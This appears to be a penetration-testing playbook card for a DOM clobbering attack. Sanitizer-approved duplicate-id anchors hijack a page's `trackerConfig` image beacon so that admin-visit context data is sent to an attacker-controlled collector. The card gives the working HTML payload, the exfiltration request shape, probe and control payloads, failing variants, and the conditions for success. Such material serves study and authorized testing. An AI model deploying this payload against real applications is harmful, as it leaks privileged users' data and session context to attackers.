# DOM Clobber `trackerConfig` Image Beacon

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- user HTML is sanitized with DOMPurify (or similar) then inserted via `innerHTML`
- page script reads `window.trackerConfig` and beacons with `new Image().src`
- serialized `window.__ctx` (or similar) is appended to the beacon URL
- an admin/reviewer visit is required to populate privileged context

## Requirements

- DOMPurify allows `<a id="...">` in the widget body.
- Duplicate `id` clobbering exposes `trackerConfig` as an `HTMLCollection`.
- A named child or second `id` match provides `endpoint` as an anchor with a useful `href`.
- Collector can receive GET requests (webhook, Burp Collaborator, etc.).
- Target workflow dispatches an admin to view the widget.

## Minimal Payload

```html
<a id="trackerConfig"></a><a id="trackerConfig" name="endpoint" href="https://[collector]"></a>
```

## Expected Request Shape

```text
GET https://[collector]?d=%7B...%7D
```

Decode `d` as JSON. Admin/reviewer visits may include privileged fields:

```json
{"flag":"..."}
```

User-only visits may show empty or minimal context:

```json
{}
```

## Controls

Prove clobber vs coincidence:

```html
<a id="trackerConfig"></a><a id="trackerConfig" name="endpoint" href="https://[collector]?m=probe"></a>
```

Baseline without clobber (should hit default `/api/ping` or fail to reach collector):

```html
<p>hello</p>
```

## Alternate Shapes That Often Fail

These usually do **not** produce a useful URL string:

```html
<form id="trackerConfig"><input name="endpoint" value="https://[collector]"></form>

<form id="trackerConfig"><img name="endpoint" src="https://[collector]"></form>
```

`String(tracker.endpoint)` becomes `[object HTMLInputElement]` or similar, not the collector URL.

## Why It Works

`window.trackerConfig` is resolved after attacker HTML is in the DOM. The collection clobber makes `tracker.endpoint` an anchor; `String(anchor)` coerces to `href`. The page's own beacon code exfiltrates `JSON.stringify(window.__ctx)`.

## Why It Fails

- Sanitizer removes `id` attributes needed for the clobber.
- Only one `trackerConfig` element survives.
- Admin review never happens.
- Privileged data is not in `window.__ctx`.
- CSP or network policy blocks outbound image requests to the collector.

## Common Mistakes

- Using `form` + `input name="endpoint"` and expecting `String()` to return the value.
- Testing only as the low-privilege user and concluding `__ctx` is empty.
- Forgetting to report/send the widget to admin when the lab requires reviewer context.
- Storing live flags, cookies, or target-specific collector URLs in reusable payload files.

## Defensive Note

Sanitization does not sanitize the JavaScript environment. Post-render global lookups are a separate vulnerability class from XSS in the snippet.
